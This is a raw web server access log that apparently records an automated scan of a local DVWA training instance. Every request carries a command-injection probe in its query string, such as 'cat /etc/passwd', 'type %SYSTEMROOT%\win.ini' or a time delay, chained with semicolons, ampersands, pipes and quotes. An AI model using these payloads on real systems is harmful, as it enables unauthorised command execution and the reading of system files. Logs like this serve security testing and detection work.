172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%26sleep+15%26 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%26sleep+15%26 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%3Bsleep+15%3B HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%3Bsleep+15%3B HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%26timeout+%2FT+15 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%26timeout+%2FT+15 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%3Bget-help HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%3Bget-help HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22%3Bget-help HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%22%3Bget-help HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27%3Bget-help HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%27%3Bget-help HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%3Bget-help+%23 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%3Bget-help+%23 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/logo.png?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/RandomStorm.png?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 301 600 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 301 600 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 301 612 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%26sleep+15%26 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 301 612 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%3Bsleep+15%3B HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 301 612 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 301 612 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%26sleep+15%26 HTTP/1.1" 301 578 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%3Bsleep+15%3B HTTP/1.1" 301 578 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%22%26sleep+15%26%22 HTTP/1.1" 301 590 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 301 590 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 301 588 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 301 607 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 618 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 618 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 301 636 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
